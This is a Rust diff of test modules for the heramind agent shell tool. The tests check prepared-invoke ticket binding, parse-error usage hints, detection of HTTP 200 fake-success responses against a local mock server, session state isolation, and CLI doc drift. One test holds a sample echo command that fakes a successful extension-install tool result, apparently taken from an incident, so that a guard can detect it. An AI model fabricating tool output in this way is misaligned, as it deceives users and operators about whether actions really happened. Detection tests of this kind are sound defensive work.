+mod prepared_invoke_bind_tests {
+    use super::bind_extension_invoke_prepared_token;
+    use heramind_core::extension::{
+        begin_instance_generation, classify_and_bind_chat_invoke, invalidate_instance_capability,
+        peek_prepared_invoke, CommandEffect, ExtensionCommand, ExtensionCommandSnapshot,
+        MetricDataType, ParameterDefinition,
+    };
+    use serde_json::json;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    fn publish(id: &str, effect: CommandEffect) {
+        invalidate_instance_capability(id);
+        let gen = begin_instance_generation(id);
+        let get = ExtensionCommand {
+            name: "get_weather".into(),
+            display_name: "Get Weather".into(),
+            description: "Query weather".into(),
+            parameters: vec![ParameterDefinition {
+                name: "city".into(),
+                display_name: "City".into(),
+                description: "City name".into(),
+                param_type: MetricDataType::String,
+                required: true,
+                default_value: None,
+                min: None,
+                max: None,
+                options: vec![],
+            }],
+            effect: Some(effect),
+            replay_safety: None,
+            execution: None,
+            ..Default::default()
+        };
+        ExtensionCommandSnapshot::build(id, "2.14.0", None, vec![get], gen)
+            .publish_capabilities()
+            .unwrap();
+    }
+
+    #[tokio::test]
+    async fn shell_bind_after_ro_classify_reload_mutating_is_stale() {
+        let id = "weather-forecast-shell-bind-v1";
+        publish(id, CommandEffect::ReadOnly);
+        let params = json!({"city": "Xiamen"});
+        let bind = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        assert_eq!(bind.effect, CommandEffect::ReadOnly);
+        let op = bind.prepared_operation_id.unwrap();
+
+        publish(id, CommandEffect::Mutating);
+
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--params".into(),
+            r#"{"city":"Xiamen"}"#.into(),
+        ];
+        let err = heramind_cli_ops::dispatch::with_extension_invoke_host_context(
+            heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+                prepared_operation_id: Some(op),
+                structured_params: Some(params.clone()),
+                ..Default::default()
+            },
+            async { bind_extension_invoke_prepared_token(argv) },
+        )
+        .await
+        .unwrap_err();
+        assert!(
+            err.contains("stale")
+                || err.contains("unbound")
+                || err.contains("reload")
+                || err.contains("missing"),
+            "shell bind must fail stale without re-preparing, got: {err}"
+        );
+        let bind2 = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        assert_eq!(bind2.effect, CommandEffect::Mutating);
+        invalidate_instance_capability(id);
+    }
+
+    #[test]
+    fn shell_bind_without_token_fails_closed_not_fifo() {
+        let id = "weather-forecast-shell-bind-v2";
+        publish(id, CommandEffect::ReadOnly);
+        let params = json!({"city": "Xiamen"});
+        let _ = classify_and_bind_chat_invoke(id, "get_weather", &params);
+
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--params".into(),
+            r#"{"city":"Xiamen"}"#.into(),
+        ];
+        let err = bind_extension_invoke_prepared_token(argv).unwrap_err();
+        assert!(
+            err.contains("missing") || err.contains("unbound"),
+            "must not FIFO-claim without token: {err}"
+        );
+        assert!(
+            err.contains("never minted") || err.contains("no ticket was minted"),
+            "never-minted path must not claim case-c strip: {err}"
+        );
+        assert!(
+            !err.contains("stripped at execute canonicalize"),
+            "case-c restore wording must not appear when ticket was never present: {err}"
+        );
+        invalidate_instance_capability(id);
+    }
+
+    /// NM-302: illegal --params at bind → params tip, not case-c wording.
+    #[test]
+    fn shell_bind_illegal_params_reports_parse_tip_not_case_c() {
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            "weather-forecast-v2".into(),
+            "get_weather".into(),
+            "--params".into(),
+            "{city:xiamen}".into(),
+        ];
+        let err = bind_extension_invoke_prepared_token(argv).unwrap_err();
+        assert!(
+            err.contains("could not parse invoke params") || err.contains("parse"),
+            "illegal params must surface parse guidance: {err}"
+        );
+        assert!(
+            !err.contains("stripped at execute canonicalize"),
+            "must not blame case-c when params are illegal: {err}"
+        );
+        assert!(
+            err.contains("params") || err.contains("Preferred"),
+            "must include structured-params tip: {err}"
+        );
+    }
+
+    /// B5: argv `--prepared-operation-id` without host context is ignored and
+    /// rejected as missing (host context is the sole source of tickets).
+    #[test]
+    fn shell_bind_ignores_argv_ticket_without_host_context() {
+        let id = "weather-forecast-shell-bind-argv-only";
+        publish(id, CommandEffect::ReadOnly);
+        let params = json!({"city": "Xiamen"});
+        let bind = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        let op = bind.prepared_operation_id.unwrap();
+
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--params".into(),
+            r#"{"city":"Xiamen"}"#.into(),
+            "--prepared-operation-id".into(),
+            op.clone(),
+        ];
+        let err = bind_extension_invoke_prepared_token(argv).unwrap_err();
+        assert!(
+            err.contains("PreparedInvoke missing"),
+            "argv-only ticket must not be accepted: {err}"
+        );
+        assert!(
+            peek_prepared_invoke(&op).is_some(),
+            "ticket must remain untouched"
+        );
+        invalidate_instance_capability(id);
+    }
+
+    /// A RO classify → reload → B Mutating classify → A bind with A's id →
+    /// stale. B's ticket stays unclaimed; "execute count" stays zero because
+    /// bind fails before HTTP/extension dispatch.
+    #[tokio::test]
+    async fn shell_interleave_a_ro_reload_b_write_a_bind_stale_zero_exec() {
+        static EXEC_COUNT: AtomicUsize = AtomicUsize::new(0);
+        EXEC_COUNT.store(0, Ordering::SeqCst);
+
+        let id = "weather-forecast-shell-bind-v3";
+        publish(id, CommandEffect::ReadOnly);
+        let params = json!({"city": "Xiamen"});
+        let a = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        assert_eq!(a.effect, CommandEffect::ReadOnly);
+        let a_id = a.prepared_operation_id.unwrap();
+
+        publish(id, CommandEffect::Mutating);
+        let b = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        assert_eq!(b.effect, CommandEffect::Mutating);
+        let b_id = b.prepared_operation_id.unwrap();
+        assert_ne!(a_id, b_id);
+
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--params".into(),
+            r#"{"city":"Xiamen"}"#.into(),
+        ];
+        let err = heramind_cli_ops::dispatch::with_extension_invoke_host_context(
+            heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+                prepared_operation_id: Some(a_id.clone()),
+                structured_params: Some(params),
+                ..Default::default()
+            },
+            async { bind_extension_invoke_prepared_token(argv) },
+        )
+        .await
+        .unwrap_err();
+        assert!(
+            err.contains("stale") || err.contains("missing") || err.contains("unbound"),
+            "A must get stale, got: {err}"
+        );
+        // Bind failure means we never reached execute — count stays 0.
+        assert_eq!(EXEC_COUNT.load(Ordering::SeqCst), 0);
+        // B's ticket was not claimed/authorized by A's attempt.
+        let b_peek = peek_prepared_invoke(&b_id).expect("B ticket intact");
+        assert_eq!(b_peek.operation_id, b_id);
+        assert_eq!(b_peek.contract.effect, CommandEffect::Mutating);
+        invalidate_instance_capability(id);
+    }
+}
+
+#[cfg(test)]
+mod fabrication_guard_tests {
+    use super::fabricated_tool_output;
+
+    #[test]
+    fn refuses_the_incident_shape() {
+        // Shape from the 2026-10-15 incident: echo of a fake install-success
+        // tool result (exit_code + command + stdout keys).
+        let cmd = r#"echo "{\"exit_code\":0,\"stdout\":\"{\\\"success\\\": true}\",\"command\":\"heramind extension install face-recognition\"}""#;
+        let real = fabricated_tool_output(cmd);
+        assert!(real.is_some(), "must refuse the fabricated payload");
+        assert!(
+            real.as_deref().unwrap_or("").contains("extension"),
+            "cure message should name the real command domain, got {real:?}"
+        );
+    }
+
+    #[test]
+    fn simple_echo_is_untouched() {
+        assert_eq!(fabricated_tool_output("echo hello"), None);
+        assert_eq!(
+            fabricated_tool_output(r#"echo '{"success":true}'"#),
+            None,
+            "no exit_code+command signature"
+        );
+        assert_eq!(fabricated_tool_output("heramind extension list"), None);
+        assert_eq!(fabricated_tool_output("printf '%s' hi"), None);
+    }
+}
+
+#[cfg(test)]
+mod p0_2_envelope_help_session_tests {
+    use super::*;
+    use crate::agent::task_continuity::outcome_is_pre_submission_rejection;
+    use crate::toolkit::registry::ToolRegistryBuilder;
+    use crate::toolkit::tool::{effective_success, Tool};
+    use serde_json::json;
+
+    fn enabled_shell_config() -> ShellConfig {
+        ShellConfig {
+            enabled: true,
+            timeout_secs: 10,
+            max_output_chars: 10000,
+        }
+    }
+
+    #[test]
+    fn in_process_domain_help_renders_subcommand_and_domain_from_clap() {
+        let sub = ShellTool::in_process_domain_help(
+            "dashboard",
+            Some("update-component"),
+            "retry with the exact one",
+        )
+        .expect("dashboard update-component help must render in-process");
+        assert!(
+            sub.contains("update-component")
+                && sub.contains("--component-id")
+                && sub.contains("--set"),
+            "subcommand help must list exact flags: {sub}"
+        );
+        assert!(sub.lines().count() <= 30, "help must stay bounded: {sub}");
+
+        // Unknown subcommand falls back to bare domain subcommand listing.
+        let dom = ShellTool::in_process_domain_help(
+            "dashboard",
+            Some("nonexistent-sub"),
+            "retry with the exact one",
+        )
+        .expect("unknown subcommand should fall back to domain help");
+        assert!(
+            dom.contains("add-components") && dom.contains("update-component"),
+            "domain help must list real subcommands: {dom}"
+        );
+
+        // Unknown top-level domain returns None (no subprocess spawn).
+        assert!(ShellTool::in_process_domain_help("no-such-domain", None, "note").is_none());
+    }
+
+    #[tokio::test]
+    async fn parse_error_usage_hint_includes_contract_guidance() {
+        let tool = ShellTool::new(enabled_shell_config());
+        let out = tool
+            .execute(json!({
+                "command": "heramind settings set-retention --days 7"
+            }))
+            .await
+            .unwrap();
+        assert_eq!(out.data["exit_code"], 2);
+        let hint = out.data["usage_hint"].as_str().unwrap_or("");
+        assert!(
+            hint.contains("[Contract — heramind settings set-retention]")
+                || hint.to_lowercase().contains("not --days"),
+            "contract red-line must appear in usage_hint: {hint}"
+        );
+    }
+
+    #[tokio::test]
+    async fn parse_error_suggestion_keeps_misplaced_params_tip() {
+        let tool = ShellTool::new(enabled_shell_config());
+        let out = tool
+            .execute(json!({
+                "command": "heramind dashboard add-components d1 --params '[]'"
+            }))
+            .await
+            .unwrap();
+        assert_eq!(out.data["exit_code"], 2);
+        // usage_hint is present (clap help) — suggestion must still carry the tip.
+        assert!(out.data.get("usage_hint").is_some());
+        let suggestion = out.data["suggestion"].as_str().unwrap_or("");
+        assert!(
+            suggestion.contains("does not take CLI `--params`"),
+            "misplaced --params tip must survive has_usage_hint gate: {suggestion}"
+        );
+    }
+
+    #[tokio::test]
+    async fn parse_error_emits_usage_hint_in_separate_field_with_exit_code_2() {
+        let tool = ShellTool::new(enabled_shell_config());
+        let out = tool
+            .execute(json!({
+                "command": "heramind dashboard update-component dash-1 --bogus-flag 1"
+            }))
+            .await
+            .unwrap();
+
+        assert_eq!(
+            out.data["exit_code"], 2,
+            "clap parse error must keep exit_code=2"
+        );
+        assert_eq!(
+            out.data["stdout"], "",
+            "stdout must stay empty on parse error"
+        );
+        let stderr = out.data["stderr"].as_str().unwrap_or("");
+        assert!(
+            !stderr.contains("[Reference —"),
+            "help must NOT be concatenated onto stderr: {stderr}"
+        );
+        let hint = out.data["usage_hint"]
+            .as_str()
+            .expect("parse error must attach in-process usage_hint");
+        assert!(
+            hint.contains("--component-id") && hint.contains("--set"),
+            "usage_hint must come from in-process clap help: {hint}"
+        );
+        assert!(
+            hint.contains("Preferred from Chat/shell tool")
+                && hint.contains("shell `params`")
+                && hint.contains("--set")
+                && hint.contains("<ID>")
+                && hint.contains("--component-id"),
+            "JSON-bearing command usage_hint must include required args (no ellipsis): {hint}"
+        );
+        assert!(
+            !hint.contains('…') && !hint.contains("..."),
+            "usage_hint must not elide required args with ellipsis: {hint}"
+        );
+        assert!(
+            out.data["domain_index"]
+                .as_str()
+                .is_some_and(|s| s.contains("[heramind CLI domain index")),
+            "first call in session should emit domain_index in its own field"
+        );
+        assert!(
+            outcome_is_pre_submission_rejection("shell", &Ok(out)),
+            "exit_code=2 parse failure must still classify as pre-submission rejection (Phase 1)"
+        );
+    }
+
+    /// Spawn a tiny in-process HTTP server returning realistic `ApiResponse<T>`
+    /// envelopes (including HTTP 200 embedded `"success": false` fake-successes).
+    async fn spawn_mock_api_server() -> (String, tokio::task::JoinHandle<()>) {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        let handle = tokio::spawn(async move {
+            loop {
+                let Ok((mut socket, _)) = listener.accept().await else {
+                    break;
+                };
+                tokio::spawn(async move {
+                    let mut buf = [0u8; 4096];
+                    let n = socket.read(&mut buf).await.unwrap_or(0);
+                    let req = String::from_utf8_lossy(&buf[..n]);
+                    let first_line = req.lines().next().unwrap_or("");
+                    let path = first_line.split_whitespace().nth(1).unwrap_or("");
+
+                    let body = match path {
+                        "/api/dashboards/dash-1" => json!({
+                            "success": true,
+                            "data": {
+                                "id": "dash-1",
+                                "name": "Ops",
+                                "components": [
+                                    {"id": "c1", "type": "metric", "position": {"x": 0, "y": 0, "w": 4, "h": 2}}
+                                ]
+                            },
+                            "meta": {"timestamp": 1}
+                        }),
+                        "/api/rules/rule-1" => json!({
+                            "success": true,
+                            "data": {
+                                "rule": {"id": "rule-1", "name": "HighTemp", "enabled": true},
+                                "history": []
+                            },
+                            "meta": {"timestamp": 1}
+                        }),
+                        "/api/devices/dev-1/current" => json!({
+                            "success": true,
+                            "data": {
+                                "device": {"id": "dev-1", "name": "Sensor"},
+                                "metrics": {"temp": {"value": 23.5, "unit": "C", "timestamp": 1000}},
+                                "commands": []
+                            },
+                            "meta": {"timestamp": 1}
+                        }),
+                        "/api/agents/agent-1" => json!({
+                            "success": true,
+                            "data": {"id": "agent-1", "name": "Monitor", "status": "active"},
+                            "meta": {"timestamp": 1}
+                        }),
+                        "/api/brokers/b-1/test" => json!({
+                            "success": true,
+                            "data": {
+                                "success": false,
+                                "message": "Invalid broker configuration: empty host"
+                            },
+                            "meta": {"timestamp": 1}
+                        }),
+                        "/api/extensions/market/install" => json!({
+                            "success": true,
+                            "data": {
+                                "success": false,
+                                "extension_id": "bogus",
+                                "downloaded": false,
+                                "installed": false,
+                                "error": "Extension not found: 404 Not Found"
+                            },
+                            "meta": {"timestamp": 1}
+                        }),
+                        _ => json!({
+                            "success": true,
+                            "data": {"path": path},
+                            "meta": {"timestamp": 1}
+                        }),
+                    }
+                    .to_string();
+
+                    let resp = format!(
+                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+                        body.len(),
+                        body
+                    );
+                    let _ = socket.write_all(resp.as_bytes()).await;
+                });
+            }
+        });
+        (format!("http://{addr}/api"), handle)
+    }
+
+    struct ApiBaseEnvGuard(Option<std::ffi::OsString>);
+    impl ApiBaseEnvGuard {
+        fn set(url: &str) -> Self {
+            let prev = std::env::var_os("HERAMIND_API_BASE");
+            std::env::set_var("HERAMIND_API_BASE", url);
+            Self(prev)
+        }
+    }
+    impl Drop for ApiBaseEnvGuard {
+        fn drop(&mut self) {
+            match &self.0 {
+                Some(v) => std::env::set_var("HERAMIND_API_BASE", v),
+                None => std::env::remove_var("HERAMIND_API_BASE"),
+            }
+        }
+    }
+
+    #[serial_test::serial]
+    #[tokio::test]
+    async fn l2_single_layer_json_stdout_no_success_help_and_http_200_fake_success_blocked() {
+        let (base_url, server) = spawn_mock_api_server().await;
+        let _env = ApiBaseEnvGuard::set(&base_url);
+
+        let tool = ShellTool::new(enabled_shell_config());
+
+        // 1. First successful command (`dashboard get`):
+        //    - stdout is 100% valid JSON (no plain-text `--help` or `DOMAIN_INDEX`)
+        //    - single-layer CliResponse envelope (no nested `data.success` or `data.data`)
+        //    - `domain_index` delivered once in its own field
+        //    - `usage_hint` absent on success
+        let dash = tool
+            .execute(json!({"command": "heramind dashboard get dash-1"}))
+            .await
+            .unwrap();
+        assert_eq!(dash.data["exit_code"], 0);
+        assert!(effective_success("shell", &dash));
+        assert!(
+            dash.data.get("usage_hint").is_none(),
+            "successful dashboard get must NOT attach 28-line --help: {}",
+            dash.data
+        );
+        assert!(
+            dash.data["domain_index"]
+                .as_str()
+                .is_some_and(|s| s.contains("[heramind CLI domain index")),
+            "first session call must emit domain_index in separate field"
+        );
+        let stdout = dash.data["stdout"].as_str().unwrap();
+        let parsed: serde_json::Value =
+            serde_json::from_str(stdout).expect("stdout must be 100% valid JSON");
+        assert_eq!(parsed["success"], true);
+        assert_eq!(parsed["data"]["id"], "dash-1");
+        assert!(
+            parsed["data"].get("success").is_none() && parsed["data"].get("data").is_none(),
+            "dashboard get must have single-layer envelope: {parsed}"
+        );
+
+        // 2. Subsequent successful calls (`rule get`, `device get`, `agent get`):
+        //    all pure single-layer JSON, no repeated `domain_index`, no `usage_hint`.
+        for (cmd, check_key) in [
+            ("heramind rule get rule-1", "rule"),
+            ("heramind device get dev-1", "device"),
+            ("heramind agent get agent-1", "id"),
+        ] {
+            let out = tool.execute(json!({"command": cmd})).await.unwrap();
+            assert_eq!(out.data["exit_code"], 0, "cmd `{cmd}` failed: {}", out.data);
+            assert!(
+                out.data.get("domain_index").is_none(),
+                "domain_index must only fire once per session"
+            );
+            assert!(
+                out.data.get("usage_hint").is_none(),
+                "usage_hint must not fire on success"
+            );
+            let parsed: serde_json::Value =
+                serde_json::from_str(out.data["stdout"].as_str().unwrap())
+                    .expect("stdout must remain valid JSON");
+            assert_eq!(parsed["success"], true);
+            assert!(
+                parsed["data"].get(check_key).is_some(),
+                "expected `{check_key}` directly in single-layer data for `{cmd}`: {parsed}"
+            );
+            assert!(
+                parsed["data"].get("success").is_none(),
+                "nested `data.success` must not exist for `{cmd}`: {parsed}"
+            );
+        }
+
+        // 3. HTTP 200 embedded `"success": false` fake-successes (`mqtt/brokers.rs`,
+        //    `extensions/marketplace.rs`): must exit non-zero, effective_success=false,
+        //    and NOT be misclassified as pre-submission `Rejected`.
+        for (cmd, expected_err) in [
+            (
+                "heramind connector test b-1",
+                "Invalid broker configuration: empty host",
+            ),
+            (
+                "heramind extension market-install bogus",
+                "Extension not found: 404 Not Found",
+            ),
+        ] {
+            let out = tool.execute(json!({"command": cmd})).await.unwrap();
+            assert_eq!(
+                out.data["exit_code"], 1,
+                "HTTP 200 embedded success:false must return non-zero exit_code for `{cmd}`: {}",
+                out.data
+            );
+            assert!(
+                !effective_success("shell", &out),
+                "effective_success must be false for `{cmd}`"
+            );
+            assert!(
+                !outcome_is_pre_submission_rejection("shell", &Ok(out.clone())),
+                "server-side HTTP 200 business failure must NOT be misclassified as Rejected: {}",
+                out.data
+            );
+            let stderr = out.data["stderr"].as_str().unwrap_or("");
+            assert!(
+                stderr.contains(expected_err),
+                "stderr must carry real business error `{expected_err}`, got: {stderr}"
+            );
+        }
+
+        server.abort();
+    }
+
+    #[serial_test::serial]
+    #[tokio::test]
+    async fn l2_multi_session_domain_index_isolation_in_same_process() {
+        let (base_url, server) = spawn_mock_api_server().await;
+        let _env = ApiBaseEnvGuard::set(&base_url);
+
+        // One shared registry (mirrors long-running server / SessionManager).
+        let shared_registry = ToolRegistryBuilder::new()
+            .with_shell_tool(Some(enabled_shell_config()))
+            .build();
+
+        let session_a = shared_registry.for_chat_session("session-a");
+        let session_b = shared_registry.for_chat_session("session-b");
+
+        let shell_a = session_a.get("shell").expect("shell in session A");
+        let shell_b = session_b.get("shell").expect("shell in session B");
+
+        // Session A: call 1 gets domain_index, call 2 does not.
+        let a1 = shell_a
+            .execute(json!({"command": "heramind dashboard get dash-1"}))
+            .await
+            .unwrap();
+        assert!(
+            a1.data["domain_index"].is_string(),
+            "Session A first call must receive domain_index"
+        );
+        let a2 = shell_a
+            .execute(json!({"command": "heramind rule get rule-1"}))
+            .await
+            .unwrap();
+        assert!(
+            a2.data.get("domain_index").is_none(),
+            "Session A second call must not repeat domain_index"
+        );
+
+        // Session B (same process, started after Session A): call 1 MUST STILL
+        // receive domain_index — proving no process-global static leakage.
+        let b1 = shell_b
+            .execute(json!({"command": "heramind dashboard get dash-1"}))
+            .await
+            .unwrap();
+        assert!(
+            b1.data["domain_index"].is_string(),
+            "Session B first call must receive domain_index independently of Session A"
+        );
+        let b2 = shell_b
+            .execute(json!({"command": "heramind rule get rule-1"}))
+            .await
+            .unwrap();
+        assert!(
+            b2.data.get("domain_index").is_none(),
+            "Session B second call must not repeat domain_index"
+        );
+
+        // Clearing history resets Session A's injection state without affecting Session B.
+        session_a.reset_session_state();
+        let a3 = shell_a
+            .execute(json!({"command": "heramind agent get agent-1"}))
+            .await
+            .unwrap();
+        assert!(
+            a3.data["domain_index"].is_string(),
+            "Session A after reset_session_state must receive domain_index again"
+        );
+        let b3 = shell_b
+            .execute(json!({"command": "heramind agent get agent-1"}))
+            .await
+            .unwrap();
+        assert!(
+            b3.data.get("domain_index").is_none(),
+            "Resetting Session A must not affect Session B"
+        );
+
+        server.abort();
+    }
+
+    /// P2-3 Anti-Drift Scanner: every `heramind <domain> <subcommand>` referenced
+    /// in `DOMAIN_INDEX` and in ALL builtin skill guides (`skills/builtins/*.md`,
+    /// both command examples and YAML `tool_target`) must resolve to a real
+    /// clap subcommand in `heramind_cli_ops::dispatch::commands::Args`.
+    #[test]
+    fn anti_drift_scanner_builtin_skills_and_domain_index_match_clap_tree() {
+        use clap::CommandFactory;
+        use std::collections::{BTreeMap, BTreeSet};
+
+        let root = heramind_cli_ops::dispatch::commands::Args::command();
+        // Map domain name -> set of valid subcommand names + aliases (empty set
+        // for leaf top-level commands like `health`).
+        let mut domain_subcommands: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
+        for sub in root.get_subcommands() {
+            let mut names = BTreeSet::new();
+            for child in sub.get_subcommands() {
+                names.insert(child.get_name().to_string());
+                for alias in child.get_all_aliases() {
+                    names.insert(alias.to_string());
+                }
+            }
+            domain_subcommands.insert(sub.get_name().to_string(), names);
+        }
+
+        let mut failures: Vec<String> = Vec::new();
+
+        // 1) Scan `DOMAIN_INDEX` bullet lines (`- <domain>: verb1 verb2 ...`).
+        for line in DOMAIN_INDEX.lines() {
+            let Some(rest) = line.trim().strip_prefix("- ") else {
+                continue;
+            };
+            let Some((domain, body)) = rest.split_once(':') else {
+                continue;
+            };
+            let domain = domain.trim();
+            let Some(valid) = domain_subcommands.get(domain) else {
+                failures.push(format!("DOMAIN_INDEX: unknown domain `{domain}`"));
+                continue;
+            };
+            // Stop before parenthetical prose notes.
+            let verbs_part = body.split('(').next().unwrap_or(body);
+            for tok in verbs_part.split_whitespace() {
+                // Skip placeholder args like `<ID>`, `<CMD>`, `<active|paused>`.
+                if tok.starts_with('<') || tok.starts_with('[') || tok.starts_with('-') {
+                    continue;
+                }
+                if !valid.contains(tok) {
+                    failures.push(format!(
+                        "DOMAIN_INDEX: `heramind {domain} {tok}` does not exist in Args::command()"
+                    ));
+                }
+            }
+        }
+
+        // 2) Scan every builtin skill `.md` file under `src/skills/builtins/`.
+        //    Inspects YAML `tool_target` entries, fenced code blocks, and inline
+        //    backtick code spans so prose words after `` `heramind settings` ``
+        //    are never misread as subcommands.
+        let builtins_dir =
+            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/skills/builtins");
+        let mut md_paths: Vec<std::path::PathBuf> = std::fs::read_dir(&builtins_dir)
+            .expect("read src/skills/builtins")
+            .filter_map(|e| e.ok().map(|e| e.path()))
+            .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("md"))
+            .collect();
+        md_paths.sort();
+        assert!(
+            !md_paths.is_empty(),
+            "expected builtin skill markdown files in {}",
+            builtins_dir.display()
+        );
+
+        let is_cli_ident = |s: &str| {
+            !s.is_empty()
+                && s.bytes()
+                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+                && s.as_bytes()[0].is_ascii_lowercase()
+        };
+
+        let check_code_snippet = |snippet: &str,
+                                  file: &str,
+                                  line_no: usize,
+                                  domain_subcommands: &BTreeMap<String, BTreeSet<String>>,
+                                  failures: &mut Vec<String>| {
+            let mut search_from = 0usize;
+            while let Some(rel) = snippet[search_from..].find("heramind ") {
+                let pos = search_from + rel;
+                search_from = pos + "heramind ".len();
+                if pos > 0 {
+                    let prev = snippet.as_bytes()[pos - 1];
+                    if prev.is_ascii_alphanumeric() || prev == b'_' || prev == b'-' {
+                        continue;
+                    }
+                }
+                let after = &snippet[pos + "heramind ".len()..];
+                let mut tokens = after.split_whitespace();
+                let Some(raw_dom) = tokens.next() else {
+                    continue;
+                };
+                let dom = raw_dom.trim_matches(|c: char| {
+                    matches!(c, '"' | '\'' | '(' | ')' | ',' | '.' | ':' | ';' | '|')
+                });
+                let Some(valid) = domain_subcommands.get(dom) else {
+                    continue;
+                };
+                if valid.is_empty() {
+                    continue;
+                }
+                let Some(raw_sub) = tokens.next() else {
+                    continue;
+                };
+                let sub = raw_sub.trim_matches(|c: char| {
+                    matches!(c, '"' | '\'' | '(' | ')' | ',' | '.' | ':' | ';' | '|')
+                });
+                if !is_cli_ident(sub) {
+                    continue;
+                }
+                if !valid.contains(sub) {
+                    failures.push(format!(
+                        "{file}:{line_no} `heramind {dom} {sub}` does not exist in Args::command()"
+                    ));
+                }
+            }
+        };
+
+        for path in md_paths {
+            let file = path
+                .file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("unknown");
+            let content = std::fs::read_to_string(&path).expect("read builtin skill");
+
+            let mut in_frontmatter = false;
+            let mut in_code_fence = false;
+            let mut current_tool: Option<String> = None;
+            for (idx, raw_line) in content.lines().enumerate() {
+                let line_no = idx + 1;
+                let trimmed = raw_line.trim();
+                if idx == 0 && trimmed == "---" {
+                    in_frontmatter = true;
+                    continue;
+                }
+                if in_frontmatter {
+                    if trimmed == "---" {
+                        in_frontmatter = false;
+                        continue;
+                    }
+                    if let Some(t) = trimmed.strip_prefix("- tool:") {
+                        current_tool = Some(t.trim().to_string());
+                    } else if let Some(rest) = trimmed.strip_prefix("actions:") {
+                        if let Some(domain) = current_tool.as_deref() {
+                            if let Some(valid) = domain_subcommands.get(domain) {
+                                let list =
+                                    rest.trim().trim_start_matches('[').trim_end_matches(']');
+                                for act in list.split(',').map(str::trim).filter(|s| !s.is_empty())
+                                {
+                                    if !valid.contains(act) {
+                                        failures.push(format!(
+                                            "{file}:{line_no} tool_target `{domain}` action `{act}` does not exist in Args::command()"
+                                        ));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    continue;
+                }
+
+                if trimmed.starts_with("```") {
+                    in_code_fence = !in_code_fence;
+                    continue;
+                }
+
+                if in_code_fence {
+                    let code_part = raw_line.split('#').next().unwrap_or(raw_line);
+                    check_code_snippet(
+                        code_part,
+                        file,
+                        line_no,
+                        &domain_subcommands,
+                        &mut failures,
+                    );
+                    continue;
+                }
+
+                // Skip explicit negative examples documenting non-existent commands.
+                if raw_line.contains("do NOT exist") || raw_line.contains("does NOT exist") {
+                    continue;
+                }
+
+                // Scan inline backtick code spans: `heramind <domain> <subcommand> ...`
+                let mut rest = raw_line;
+                while let Some(open) = rest.find('`') {
+                    let after_open = &rest[open + 1..];
+                    let Some(close) = after_open.find('`') else {
+                        break;
+                    };
+                    let span = &after_open[..close];
+                    check_code_snippet(span, file, line_no, &domain_subcommands, &mut failures);
+                    rest = &after_open[close + 1..];
+                }
+            }
+        }
+
+        assert!(
+            failures.is_empty(),
+            "Anti-drift scanner found {} stale CLI reference(s):\n{}",
+            failures.len(),
+            failures.join("\n")
+        );
+    }
+
+    #[test]
+    fn shell_command_param_pipe_description_matches_capability_index() {
+        let params = ShellTool::new(ShellConfig::default()).parameters();
+        let cmd_desc = params["properties"]["command"]["description"]
+            .as_str()
+            .unwrap();
+        assert!(
+            cmd_desc.contains("built-in filter flags") && cmd_desc.contains("native host commands"),
+            "shell command param description must unify pipe rules with capability_index: {cmd_desc}"
+        );
     }
 }
